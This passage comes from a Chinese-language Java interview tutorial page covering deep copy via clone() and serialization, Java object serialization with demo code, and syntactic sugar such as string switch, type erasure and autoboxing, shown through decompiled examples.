<h3 id="实现Cloneable接口，重写clone"><a href="#实现Cloneable接口，重写clone" class="headerlink" title="实现Cloneable接口，重写clone()"></a>实现Cloneable接口，重写clone()</h3><p>在Object类中定义了一个clone方法，这个方法其实在不重写的情况下，其实也是浅拷贝的。</p>
<p>如果想要实现深拷贝，就需要重写clone方法，而想要重写clone方法，就必须实现Cloneable，否则会报CloneNotSupportedException异常。</p>
<p>将上述代码修改下，重写clone方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class Address implements Cloneable&#123;</span><br><span class="line">    private String province;</span><br><span class="line">    private String city;</span><br><span class="line">    private String area;</span><br><span class="line">    //省略构造函数和setter/getter</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object clone() throws CloneNotSupportedException &#123;</span><br><span class="line">        return super.clone();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class User implements Cloneable&#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private String password;</span><br><span class="line">    private Address address;</span><br><span class="line">    //省略构造函数和setter/getter</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected Object clone() throws CloneNotSupportedException &#123;</span><br><span class="line">        User user = (User)super.clone();</span><br><span class="line">        user.setAddress((Address)address.clone());</span><br><span class="line">        return user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>之后，在执行一下上面的测试代码，就可以发现，这时候newUser中的address对象就是一个新的对象了。</p>
<p>这种方式就能实现深拷贝，但是问题是如果我们在User中有很多个对象，那么clone方法就写的很长，而且如果后面有修改，在User中新增属性，这个地方也要改。</p>
<p>那么，有没有什么办法可以不需要修改，一劳永逸呢？</p>
<h3 id="序列化实现深拷贝"><a href="#序列化实现深拷贝" class="headerlink" title="序列化实现深拷贝"></a>序列化实现深拷贝</h3><p>我们可以借助序列化来实现深拷贝。先把对象序列化成流，再从流中反序列化成对象，这样就一定是新的对象了。</p>
<p>序列化的方式有很多，比如我们可以使用各种JSON工具，把对象序列化成JSON字符串，然后再从字符串中反序列化成对象。</p>
<p>如使用fastjson实现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User newUser = JSON.parseObject(JSON.toJSONString(user), User.class);</span><br></pre></td></tr></table></figure>



<p>也可实现深拷贝。</p>
<p>除此之外，还可以使用Apache Commons Lang中提供的SerializationUtils工具实现。</p>
<p>我们需要修改下上面的User和Address类，使他们实现Serializable接口，否则是无法进行序列化的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class User implements Serializable</span><br><span class="line">class Address implements Serializable</span><br></pre></td></tr></table></figure>



<p>然后在需要拷贝的时候：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User newUser = (User) SerializationUtils.clone(user);</span><br></pre></td></tr></table></figure>



<p>同样，也可以实现深拷贝啦~！</p>
<h1 id="✅什么是序列化与反序列化"><a href="#✅什么是序列化与反序列化" class="headerlink" title="✅什么是序列化与反序列化"></a>✅什么是序列化与反序列化</h1><h2 id="典型回答-12"><a href="#典型回答-12" class="headerlink" title="典型回答"></a>典型回答</h2><p>在Java中，我们可以通过多种方式来创建对象，并且只要对象没有被回收我们都可以复用该对象。但是，我们创建出来的这些Java对象都是存在于JVM的堆内存中的。只有JVM处于运行状态的时候，这些对象才可能存在。一旦JVM停止运行，这些对象的状态也就随之而丢失了。</p>
<p>但是在真实的应用场景中，我们需要将这些对象持久化下来，并且能够在需要的时候把对象重新读取出来。Java的对象序列化可以帮助我们实现该功能。</p>
<p>对象序列化机制（object serialization）是Java语言内建的一种对象持久化方式，**通过对象序列化，可以把对象的状态保存为字节数组，并且可以在有需要的时候将这个字节数组通过反序列化的方式再转换成对象。**对象序列化可以很容易的在JVM中的活动对象和字节数组（流）之间进行转换。</p>
<p>所以序列化就是把Java对象序列化成字节数组的过程，反序列化就是把字节数组再转换成Java对象的过程。</p>
<h2 id="扩展知识-5"><a href="#扩展知识-5" class="headerlink" title="扩展知识"></a>扩展知识</h2><h2 id="如何进行序列化和反序列化"><a href="#如何进行序列化和反序列化" class="headerlink" title="如何进行序列化和反序列化"></a>如何进行序列化和反序列化</h2><p>在Java中，只要一个类实现了java.io.Serializable接口，那么它就可以被序列化。这里先来一段代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">package com.hollis;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line">import java.util.Date;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Created by hollis on 16/2/2.</span><br><span class="line"> */</span><br><span class="line">public class User implements Serializable&#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line">    private Date birthday;</span><br><span class="line">    private transient String gender;</span><br><span class="line">    private static final long serialVersionUID = -6849794470754667710L;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getAge() &#123;</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setAge(int age) &#123;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Date getBirthday() &#123;</span><br><span class="line">        return birthday;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setBirthday(Date birthday) &#123;</span><br><span class="line">        this.birthday = birthday;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getGender() &#123;</span><br><span class="line">        return gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setGender(String gender) &#123;</span><br><span class="line">        this.gender = gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;User&#123;&quot; +</span><br><span class="line">                &quot;name=&#x27;&quot; + name + &#x27;\&#x27;&#x27; +</span><br><span class="line">                &quot;, age=&quot; + age +</span><br><span class="line">                &quot;, gender=&quot; + gender +</span><br><span class="line">                &quot;, birthday=&quot; + birthday +</span><br><span class="line">                &#x27;&#125;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>code 2 对User进行序列化及反序列化的Demo：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">package com.hollis;</span><br><span class="line">import org.apache.commons.io.FileUtils;</span><br><span class="line">import org.apache.commons.io.IOUtils;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.util.Date;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Created by hollis on 16/2/2.</span><br><span class="line"> */</span><br><span class="line">public class SerializableDemo &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //Initializes The Object</span><br><span class="line">        User user = new User();</span><br><span class="line">        user.setName(&quot;hollis&quot;);</span><br><span class="line">        user.setGender(&quot;male&quot;);</span><br><span class="line">        user.setAge(23);</span><br><span class="line">        user.setBirthday(new Date());</span><br><span class="line">        System.out.println(user);</span><br><span class="line"></span><br><span class="line">        //Write Obj to File</span><br><span class="line">        ObjectOutputStream oos = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            oos = new ObjectOutputStream(new FileOutputStream(&quot;tempFile&quot;));</span><br><span class="line">            oos.writeObject(user);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            IOUtils.closeQuietly(oos);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //Read Obj from File</span><br><span class="line">        File file = new File(&quot;tempFile&quot;);</span><br><span class="line">        ObjectInputStream ois = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            ois = new ObjectInputStream(new FileInputStream(file));</span><br><span class="line">            User newUser = (User) ois.readObject();</span><br><span class="line">            System.out.println(newUser);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            IOUtils.closeQuietly(ois);</span><br><span class="line">            try &#123;</span><br><span class="line">                FileUtils.forceDelete(file);</span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//output </span><br><span class="line">//User&#123;name=&#x27;hollis&#x27;, age=23, gender=male, birthday=Tue Feb 02 17:37:38 CST 2016&#125;</span><br><span class="line">//User&#123;name=&#x27;hollis&#x27;, age=23, gender=null, birthday=Tue Feb 02 17:37:38 CST 2016&#125;</span><br></pre></td></tr></table></figure>



<p>以下几个和序列化&amp;反序列化有关的知识点大家可以重点关注一下：</p>
<p>1、在Java中，只要一个类实现了java.io.Serializable接口，那么它就可以被序列化。</p>
<p>2、通过ObjectOutputStream和ObjectInputStream对对象进行序列化及反序列化</p>
<p>3、虚拟机是否允许反序列化，不仅取决于类路径和功能代码是否一致，一个非常重要的一点是两个类的序列化 ID 是否一致（就是 private static final long serialVersionUID）</p>
<p>4、序列化并不保存静态变量。</p>
<p>5、要想将父类对象也序列化，就需要让父类也实现Serializable 接口。</p>
<p>6、transient 关键字的作用是控制变量的序列化，在变量声明前加上该关键字，可以阻止该变量被序列化到文件中，在被反序列化后，transient 变量的值被设为初始值，如 int 型的是 0，对象型的是 null。</p>
<p>7、服务器端给客户端发送序列化对象数据，对象中有一些数据是敏感的，比如密码字符串等，希望对该密码字段在序列化时，进行加密，而客户端如果拥有解密的密钥，只有在客户端进行反序列化时，才可以对密码进行读取，这样可以一定程度保证序列化对象的数据安全。</p>
<h3 id="未实现Serializable，可以序列化吗？"><a href="#未实现Serializable，可以序列化吗？" class="headerlink" title="未实现Serializable，可以序列化吗？"></a>未实现Serializable，可以序列化吗？</h3><p>如果使用Java原生的序列化机制（即通过 ObjectOutputStream 和 ObjectInputStream 类），则对象必须实现 Serializable 接口。如果对象没有实现这个接口，尝试原生序列化会抛出 NotSerializableException。  </p>
<p>对于像Jackson、Gson这样的JSON序列化库或用于XML的库（如JAXB），对象不需要实现 Serializable 接口。这些库使用反射机制来访问对象的字段，并将它们转换成JSON或XML格式。在这种情况下，对象的序列化与 Serializable 接口无关。  </p>
<h1 id="✅说几个常见的语法糖？"><a href="#✅说几个常见的语法糖？" class="headerlink" title="✅说几个常见的语法糖？"></a>✅说几个常见的语法糖？</h1><h2 id="典型回答-13"><a href="#典型回答-13" class="headerlink" title="典型回答"></a>典型回答</h2><p>语法糖（Syntactic sugar），指在计算机语言中添加的某种语法，这种语法对语言的功能并没有影响，但是更方便程序员使用。</p>
<p>虽然Java中有很多语法糖，但是Java虚拟机并不支持这些语法糖，所以这些语法糖在编译阶段就会被还原成简单的基础语法结构，这样才能被虚拟机识别，这个过程就是解语法糖。</p>
<p>如果看过Java虚拟机的源码，就会发现在编译过程中有一个重要的步骤就是调用desugar()，这个方法就是负责解语法糖的实现。</p>
<p>常见的语法糖有 switch支持枚举及字符串、泛型、条件编译、断言、可变参数、自动装箱&#x2F;拆箱、枚举、内部类、增强for循环、try-with-resources语句、lambda表达式等。</p>
<h3 id="知识扩展-4"><a href="#知识扩展-4" class="headerlink" title="知识扩展"></a>知识扩展</h3><h3 id="如何解语法糖？"><a href="#如何解语法糖？" class="headerlink" title="如何解语法糖？"></a>如何解语法糖？</h3><p>语法糖的存在主要是方便开发人员使用。但其实，Java虚拟机并不支持这些语法糖。这些语法糖在编译阶段就会被还原成简单的基础语法结构，这个过程就是解语法糖。</p>
<p>说到编译，大家肯定都知道，Java语言中javac命令可以将后缀名为.java的源文件编译为后缀名为.class的可以运行于Java虚拟机的字节码。如果你去看com.sun.tools.javac.main.JavaCompiler的源码，你会发现在compile()中有一个步骤就是调用<code>desugar()</code>，这个方法就是负责解语法糖的实现的。</p>
<h3 id="糖块一、-switch-支持-String-与枚举"><a href="#糖块一、-switch-支持-String-与枚举" class="headerlink" title="糖块一、 switch 支持 String 与枚举"></a>糖块一、 switch 支持 String 与枚举</h3><p>前面提到过，从Java 7 开始，Java语言中的语法糖在逐渐丰富，其中一个比较重要的就是Java 7中<code>switch</code>开始支持<code>String</code>。</p>
<p>在开始coding之前先科普下，Java中的<code>switch</code>自身原本就支持基本类型。比如<code>int</code>、<code>char</code>等。对于<code>int</code>类型，直接进行数值的比较。对于<code>char</code>类型则是比较其ascii码。所以，对于编译器来说，<code>switch</code>中其实只能使用整型，任何类型的比较都要转换成整型。比如<code>byte</code>。<code>short</code>，<code>char</code>(asckii码是整型)以及<code>int</code>。</p>
<p>那么接下来看下<code>switch</code>对<code>String</code>得支持，有以下代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SwitchDemoString</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;world&quot;</span>;</span><br><span class="line">        <span class="keyword">switch</span> (str) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;hello&quot;</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;world&quot;</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>反编译后内容如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SwitchDemoString</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SwitchDemoString</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;world&quot;</span>;</span><br><span class="line">        String s;</span><br><span class="line">        <span class="keyword">switch</span>((s = str).hashCode())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">99162322</span>:</span><br><span class="line">                <span class="keyword">if</span>(s.equals(<span class="string">&quot;hello&quot;</span>))</span><br><span class="line">                    System.out.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">113318802</span>:</span><br><span class="line">                <span class="keyword">if</span>(s.equals(<span class="string">&quot;world&quot;</span>))</span><br><span class="line">                    System.out.println(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>看到这个代码，你知道原来<strong>字符串的switch是通过</strong><code>**equals()**</code><strong>和</strong><code>**hashCode()**</code>**方法来实现的。**还好<code>hashCode()</code>方法返回的是<code>int</code>，而不是<code>long</code>。</p>
<blockquote>
<p>仔细看下可以发现，进行<code>switch</code>的实际是哈希值，然后通过使用<code>equals</code>方法比较进行安全检查，这个检查是必要的，因为哈希可能会发生碰撞。因此它的性能是不如使用枚举进行switch或者使用纯整数常量，但这也不是很差。</p>
</blockquote>
<h3 id="糖块二、-泛型"><a href="#糖块二、-泛型" class="headerlink" title="糖块二、 泛型"></a>糖块二、 泛型</h3><p>我们都知道，很多语言都是支持泛型的，但是很多人不知道的是，不同的编译器对于泛型的处理方式是不同的，通常情况下，一个编译器处理泛型有两种方式：<code>Code specialization</code>和<code>Code sharing</code>。C++和C#是使用<code>Code specialization</code>的处理机制，而Java使用的是<code>Code sharing</code>的机制。</p>
<blockquote>
<p>Code sharing方式为每个泛型类型创建唯一的字节码表示，并且将该泛型类型的实例都映射到这个唯一的字节码表示上。将多种泛型类形实例映射到唯一的字节码表示是通过类型擦除（<code>type erasure</code>）实现的。</p>
</blockquote>
<p>也就是说，<strong>对于Java虚拟机来说，他根本不认识</strong><code>**Map&lt;String, String&gt; map**</code><strong>这样的语法。需要在编译阶段通过类型擦除的方式进行解语法糖。</strong></p>
<p>类型擦除的主要过程如下： 1.将所有的泛型参数用其最左边界（最顶级的父类型）类型替换。 2.移除所有的类型参数。</p>
<p>以下代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();  </span><br><span class="line">map.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;hollis&quot;</span>);  </span><br><span class="line">map.put(<span class="string">&quot;wechat&quot;</span>, <span class="string">&quot;Hollis&quot;</span>);  </span><br><span class="line">map.put(<span class="string">&quot;blog&quot;</span>, <span class="string">&quot;www.hollischuang.com&quot;</span>);</span><br></pre></td></tr></table></figure>



<p>解语法糖之后会变成：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line">map.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;hollis&quot;</span>);  </span><br><span class="line">map.put(<span class="string">&quot;wechat&quot;</span>, <span class="string">&quot;Hollis&quot;</span>);  </span><br><span class="line">map.put(<span class="string">&quot;blog&quot;</span>, <span class="string">&quot;www.hollischuang.com&quot;</span>);</span><br></pre></td></tr></table></figure>



<p>以下代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;A <span class="keyword">extends</span> <span class="title class_">Comparable</span>&lt;A&gt;&gt; A <span class="title function_">max</span><span class="params">(Collection&lt;A&gt; xs)</span> &#123;</span><br><span class="line">    Iterator&lt;A&gt; xi = xs.iterator();</span><br><span class="line">    <span class="type">A</span> <span class="variable">w</span> <span class="operator">=</span> xi.next();</span><br><span class="line">    <span class="keyword">while</span> (xi.hasNext()) &#123;</span><br><span class="line">        <span class="type">A</span> <span class="variable">x</span> <span class="operator">=</span> xi.next();</span><br><span class="line">        <span class="keyword">if</span> (w.compareTo(x) &lt; <span class="number">0</span>)</span><br><span class="line">            w = x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> w;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>类型擦除后会变成：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Comparable <span class="title function_">max</span><span class="params">(Collection xs)</span>&#123;</span><br><span class="line"><span class="type">Iterator</span> <span class="variable">xi</span> <span class="operator">=</span> xs.iterator();</span><br><span class="line"><span class="type">Comparable</span> <span class="variable">w</span> <span class="operator">=</span> (Comparable)xi.next();</span><br><span class="line"><span class="keyword">while</span>(xi.hasNext())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">Comparable</span> <span class="variable">x</span> <span class="operator">=</span> (Comparable)xi.next();</span><br><span class="line">    <span class="keyword">if</span>(w.compareTo(x) &lt; <span class="number">0</span>)</span><br><span class="line">        w = x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> w;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>虚拟机中没有泛型，只有普通类和普通方法，所有泛型类的类型参数在编译时都会被擦除，泛型类并没有自己独有的</strong><code>**Class**</code><strong>类对象。比如并不存在</strong><code>**List&lt;String&gt;.class**</code><strong>或是</strong><code>**List&lt;Integer&gt;.class**</code><strong>，而只有</strong><code>**List.class**</code><strong>。</strong></p>
<h3 id="糖块三、-自动装箱与拆箱"><a href="#糖块三、-自动装箱与拆箱" class="headerlink" title="糖块三、 自动装箱与拆箱"></a>糖块三、 自动装箱与拆箱</h3><p>自动装箱就是Java自动将原始类型值转换成对应的对象，比如将int的变量转换成Integer对象，这个过程叫做装箱，反之将Integer对象转换成int类型值，这个过程叫做拆箱。因为这里的装箱和拆箱是自动进行的非人为转换，所以就称作为自动装箱和拆箱。原始类型byte, short, char, int, long, float, double 和 boolean 对应的封装类为Byte, Short, Character, Integer, Long, Float, Double, Boolean。</p>
<p>先来看个自动装箱的代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">n</span> <span class="operator">=</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>反编译后代码如下:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">n</span> <span class="operator">=</span> Integer.valueOf(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>再来看个自动拆箱的代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>反编译后代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> Integer.valueOf(<span class="number">10</span>);</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> i.intValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>从反编译得到内容可以看出，在装箱的时候自动调用的是<code>Integer</code>的<code>valueOf(int)</code>方法。而在拆箱的时候自动调用的是<code>Integer</code>的<code>intValue</code>方法。</p>
<p>所以，<strong>装箱过程是通过调用包装器的valueOf方法实现的，而拆箱过程是通过调用包装器的 xxxValue方法实现的。</strong></p>
<h3 id="糖块四-、-方法变长参数"><a href="#糖块四-、-方法变长参数" class="headerlink" title="糖块四 、 方法变长参数"></a>糖块四 、 方法变长参数</h3><p>可变参数(<code>variable arguments</code>)是在Java 1.5中引入的一个特性。它允许一个方法把任意数量的值作为参数。</p>
<p>看下以下可变参数代码，其中print方法接收可变参数：</p>
